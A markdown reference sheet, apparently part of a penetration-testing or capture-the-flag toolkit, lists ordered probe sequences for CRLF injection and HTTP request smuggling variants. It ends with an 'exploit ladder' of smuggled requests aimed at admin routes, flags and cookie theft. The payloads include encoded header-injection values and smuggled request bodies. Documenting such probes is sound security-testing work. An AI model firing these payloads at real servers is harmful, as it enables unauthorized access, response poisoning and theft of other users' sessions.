# Probe sequences — the ordered detection ladder

## Sequence 1 — the fold-check (CRLF-injection surface)

```text
1. baseline:  GET /?host=example.com
2. fold-1:    GET /?host=ex.com%0d%0aX-Inj:%201
3. fold-2:    GET /?host=ex.com%0aX-Inj:%201
4. fold-3:    GET /?host=ex.com%0dX-Inj:%201
5. fold-4:    GET /?host=ex.com%250d%250aX-Inj:%201
6. body-fold: GET /?host=ex.com%0d%0a%0d%0aGET%20/admin
```

`crlf_probe.py --url "http://t/?host={M}" --value "ex.com"` fires all
of these — the folded-header echo or status-delta is the signal.

## Sequence 2 — the CL.TE timing check

```text
1. control:   POST / CL:4 body=A=1   → 200, ~50ms
2. desync:    POST / CL:6 TE:chunked body=0\r\n\r\nG   → timeout
3. repeat:    3x — consistent hang?
4. control-2: POST / CL:4 TE:chunked body=A=1 → 200 (both honor TE)
```

If desync hangs + control-2 doesn't → CL.TE — `detection.md`.

## Sequence 3 — the TE.CL 404-poison

```text
1. POST / CL:4 TE:chunked body=5c\r\nGET /404-poison ...\r\nx=1\r\n0\r\n\r\n
2. GET / → the GET returns 404? → TE.CL confirmed
3. repeat 3x — consistent 404?
```

The queue-poison — `response-poisoning.md`.

## Sequence 4 — the TE.TE obfuscation matrix

```text
For each obfuscation:
  POST / CL:4 TE:<obf> body=5c\r\nGET /404 ...\r\nx=1\r\n0\r\n\r\n
  then GET / → 404? → that obfuscation is live
```

`obfuscation.md` — the ~15 obfuscation shapes.

## Sequence 5 — the CL.CL dup-check

```text
POST / CL:4 CL:7 body=A=1&B=2
```

Front picks 4 → back picks 7 → back reads 3 extra bytes → desync.

## Sequence 6 — the CL.0 body-ignored

```text
POST /ignored-route CL:60 body=GET /marker HTTP/1.1 Host: t
→ GET / → the response is /marker → CL.0
```

`client-side-desync.md`.

## Sequence 7 — the upgrade-tunnel

```text
GET /ws Upgrade:websocket → 101? → the tunnel is open →
send HTTP inside a frame → the back-end parses it
```

`upgrade-smuggling.md`.

## Sequence 8 — the h2 headers

```text
h2 POST / + content-length: 0 + DATA bytes → the h2→h1 downgrade
→ the back-end sees CL:0 + the body → desync
```

`http2-smuggling.md`.

## Sequence 9 — the exploit ladder

After the pair is named:

1. `GET /admin` smuggle — the internal route
2. `GET /flag` smuggle — the flag
3. `POST /store` smuggle — the cookie-steal
4. `GET /search?q=X` smuggle — the echo-readback

## Sequence 10 — the readback

```text
smuggle → GET / → the response is the smuggle's output
```

The verbatim excerpt — `evidence-rules.md`.
